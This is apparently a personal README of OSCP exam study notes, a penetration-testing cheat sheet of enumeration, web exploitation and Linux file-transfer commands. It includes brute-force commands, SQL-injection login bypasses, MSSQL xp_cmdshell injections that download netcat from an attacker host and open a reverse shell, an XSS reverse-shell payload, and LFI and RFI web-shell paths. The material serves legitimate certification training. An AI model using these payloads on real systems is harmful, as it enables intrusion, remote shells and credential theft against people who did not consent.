# oscp-notes

I Passed the OSCP in January 2021. These are the notes I took along my journey to achieving it. 

## Table of Contents
- [Enumeration](#Enumeration)
- [Web Exploitation](#Web-Exploitation)
- [Post Exploitation Linux](#Post-Exploitation-Linux)
- [Post Exploitation Windows](#Post-Exploitation-Windows)
- [Active Directory](#Active-Directory)
- [Pivoting & Port Forwarding](#Pivoting--Port-Forwarding)
- [Other](#Other)
- [Buffer Overflow](#Buffer-Overflow)

Enumeration
===============================================================================================
`Basics`


-    Standard Port Scan  
     `sudo nmap -T4 -p- -A --osscan-guess --version-all -o in.scan -Pn`

-    Udp Port Scan  
        `sudo nmap --top-ports 100 -sU -o udp.scan -Pn`

-    Extensions  
    `txt,php,aspx,cgi,asp,html,jsp,pdf,doc,docx,xls,xlsx,rtf,bak,xml,xsl,phpthml,sh,pl,py`

-    Wordlists  

         /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         /usr/share/seclists/Discovery/Web-Content/common.txt
         /usr/share/seclists/Discovery/Web-Content/big.txt
         /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
         /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
         
`TCP 21: FTP`
 
 -   Download Everything  
     `wget -m ftp://anonymous:anonymous@<ip>`
   
-    Ftp Nmap Scan  
     `nmap --script ftp-anon,ftp-bounce,ftp-brute,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-syst -p21 <RHOST>`

-    Ssl Ftp Connection  
     `openssl s_client -connect <RHOST>:21 -starttls ftp`<br><br>

`TCP 22: SSH`

-    Bruteforce  
     `hydra -l root -P /usr/share/wordlists/password/10k <RHOST> -t 4 ssh`<br><br>
     
`TCP 25: SMTP`

-    Nmap Enumeration  
     `sudo nmap --script "smtp-commands,smtp-open-relay,smtp-vuln*" -p25 <RHOST>`
     
-    User Enumeration  
     `sudo nmap --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} -p25 <RHOST>`
 
-    Version Scan  
     `auxiliary/scanner/smtp/smtp_enum`

-    Introduction  
     `HELO <LHOST> || EHLO <LHOST>`
   
-    Enumerate Users  
     `EXPN <user> || VRFY <user>`

-    Send Mail From  
     `MAIL FROM:test@test.org`
     
-    Send Mail To  
     `RCPT TO:<user>`<br><br>

`TCP 53: DNS`

-    Standard Enum  

         nslookup  
         server <RHOST>  
         127.0.0.1  
         <RHOST>  
      
-    Zone Transfer  
     `dig axfr @<RHOST> <dnsname>`<br><br>
     
`TCP 79: Finger Enumeration`

-    [Pentest Monkey Link](http://pentestmonkey.net/tools/user-enumeration/finger-user-enum)<br><br>

`tcp 88: Kerberos`

-    Use [Kerbrute](https://github.com/ropnop/kerbrute) to Enumerate Users
     `kerbrute`
     
-    Asreproast  
     `asreproast`

-    Bruteforce  
     `brute`<br><br>

`TCP 110: POP3`

-    Nmap Enum Script  
     `sudo nmap --script pop3-capabilities,pop3-ntlm-info -p110 <RHOST>`

-    Bruteforce  
     `sudo nmap --script pop3-brute -p110 <RHOST>`
     `auxiliary/scanner/pop3/pop3_login`
     
-    Login  
     
         USER <username>
         PASS <password>
         list                 - List Emails
         retr <email_num>     - Retrieve Email 
<br>

`TCP 111: RPCBIND`

-    Enumeration  
     `rpcinfo -p <RHOST>`  
     `rpcinfo -s <RHOST>`  
<br>

`TCP 119: NNTP`

-    Possible commands  
     `HELP, LIST`
<br><br>

`TCP 135 MSRPC`

-    Nmap Scan  
     `sudo nmap -n -sV -Pn -p 135 --script=msrpc-enum <RHOST>`
     
-    MSF Enum  

         use auxiliary/scanner/dcerpc/endpoint_mapper
         use auxiliary/scanner/dcerpc/hidden
         use auxiliary/scanner/dcerpc/management
         use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor  
         
-    RPC Dump  
     `/usr/bin/impacket-rpcdump <RHOST> -p 135`<br><br>
     
 `TCP 139/445: SMB/RPC`

-    smbmap  
     `smbmap -H <RHOST>`
     
-    enum4linux
     `enum4linux -a -M -l -d <RHOST> 2>&1`
   
-    Version Scan  
     `use auxiliary/scanner/smb/smb_version`
     
-    Extensive Nmap  
     `sudo nmap -p139,445 -A --script smb2-capabilities smb2-security-mode smb2-time smb2-vuln-uptime smb-brute smb-double-pulsar-backdoor smb-enum-domains smb-enum-groups smb-enum-processes smb-enum-services smb-enum-sessions smb-enum-shares smb-enum-users smb-flood smb-ls smb-mbenum smb-os-discovery smb-print-text smb-protocols smb-psexec smb-security-mode smb-server-stats smb-system-info smb-vuln-conficker smb-vuln-cve2009-3103 smb-vuln-cve-2017-7494 smb-vuln-ms06-025 smb-vuln-ms07-029 smb-vuln-ms08-067 smb-vuln-ms10-054 smb-vuln-ms10-061 smb-vuln-ms17-010 smb-vuln-regsvc-dos smb-vuln-webexec smb-webexec-exploit <RHOST>`
     
-    Enumerate Share Permissions  
     `crackmapexec smb <RHOST> --shares`
  
-    Log Into Shares  
     `smbclient //<RHOST>/<Share> -U <user>`
     
-    Dump Info  
     `python3 /usr/share/doc/python3-impacket/examples/samrdump.py <RHOST>`

-    Dump Info  
     `rpcclient -U "" <RHOST>`<br><br>
     
`TCP 143:`

-    Login  
     `A001 login <user> <password>`
     
-    Use Evolution Mail Client to Log In 
<br>

`TCP 443`

-    Manually Check Certificate  

-    Add DNS Names to /etc/hosts  

-    SSL Enum    
     `nmap -sV --script ssl-enum-ciphers <RHOST>`
     
-    Nikto  
     `nikto -h <RHOST> -p 443 -output nikto_443`

-    SSLScan  
     `sslscan <ip>`<br><br>
     
`TCP 1433: MSSQL`

-    Nmap Scan  
     `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER <RHOST>`
     
-    Log In  
     `sqsh -S <RHOST> -U <user>`
 
-    Another Login  
     `use auxiliary/scanner/mssql/mssql_login`<br><br>
     
`TCP 1521: ORACLE`
     
-    [Good Blog Post](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573)
<br>

`TCP 2049: NFS`   

-    Show Mountable Files
     `showmount -a(d)(e) <RHOST>`<br><br>
   
`TCP 3306: MYSQL`
     
-    Login  
     `mysql -u <user> -p`
    
-    Extensive Nmap  
     `nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <RHOST>`
     
-    MSF Scripts  
     
         use auxiliary/scanner/mysql/mysql_version
         use auxiliary/scanner/mysql/mysql_authbypass_hashdump
         auxiliary/scanner/mysql/mysql_hashdump
         mysql_enum
         mysql_schemadump
         mysql_start_up
         
<br>

`TCP 3389: RDP`

-    Log In  
     `rdesktop -u <user> -p <password> <RHOST>`
<br>
     
`UDP 161: SNMP`

-    Enum  
     `snmpwalk -c public -v2c <RHOST>`
     `snmp-check <RHOST>`

<br><br>

Web Exploitation
===============================================================================================
`SQL Injection`

-    SQLMap  
     `sqlmap -r <burp_file>`
     
-    Test for SQLI  
         
         '
         '-- -
         ASCII(97)
         ' or 1=1--
         '; waitfor delay ('0:0:20)'--
         wfuzz -u http://<RHOST>/FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt
     
-    Login Bypass  

         admin' --
         admin' -- -
         admin'-
         admin' #
         admin'/*
         admin' or 1=1--
         admin' or 1=1#
         admin' or 1=1/*
         admin') or '1'='1--
         admin') or ('1'='1--
    
-    Abuse Command Shell  

         ' EXEC sp_configure 'xp_cmdshell', 1--
         ' reconfigure--
         ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
         ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
       
<br>         
`LFI/RFI`

-    Linux Path  
     `../../../../../../../../etc/passwd`
 
-    Windows Path  
     `c:\windows\system32\drivers\etc\hosts`
         
-    RFI  
     `http://<LHOST:80>/p0wny_shell.php`
     
-    Wordlists  

         /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
         /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
<br>
         
`CGI-BIN`

-    Popular Extensions: .sh & .pl  

-    Nmap Check  
     `nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/<vulnerable file>,cmd=ls <RHOST>`
     
-    MSF Check  
     `auxiliary/scanner/http/apache_mod_cgi_bash_env`
     
-    MSF Exploit  
     `exploit/multi/http/apache_mod_cgi_bash_env_exec`
     
<br>

`XSS`

-    Test  
     `test: <img src=http://<lhost>/<lport>)>`
     
-    Reverse Shell
     `<img src=http://<lhost>/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LHOST>')>`
     
-    [SSTI - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

![SSTI](https://github.com/seal9055/Docs/blob/main/SSTI.png?raw=true)

<br>

`CMS`

-    WORDPRESS  
     `wpscan --url http://<RHOST> (--api-token <token>) -e u,ap,at --plugins-detection aggressive`
     
-    MAGENTO  
     [Magescan](https://github.com/steverobbins/magescan)
<br>

`Bruteforce`

-    hydra  
     `hydra -l admin -P /usr/share/wordlists/password/10k <RHOST> http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed' -V -t 64`
     
<br>
Post Exploitation Linux
===============================================================================================

`File Upload`

-    Starting Web Server  
     `python3 -m http.server 80`
     
-    Filetransfer  

         wget <LHOST>/<file>
         curl http://<LHOST>/<file> -o <output-file>
         echo "GET /<file> HTTP/1.0" | nc -n <LHOST> 80 > <out-file> && sed -i '1,7d' <out-file>
    
-    Secure Filetransfers  

         on target:  ncat -nvlp <port> --ssl > <out-file>
         on kali:  ncat -nv <RHOST> <RPORT> --ssl < <file-to-send>
     
`Enum Tools`

[Linenum](https://github.com/rebootuser/LinEnum)
[linux smart enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[pspy](https://github.com/DominicBreuker/pspy)
[suid3num](https://github.com/Anon-Exploiter/SUID3NUM)
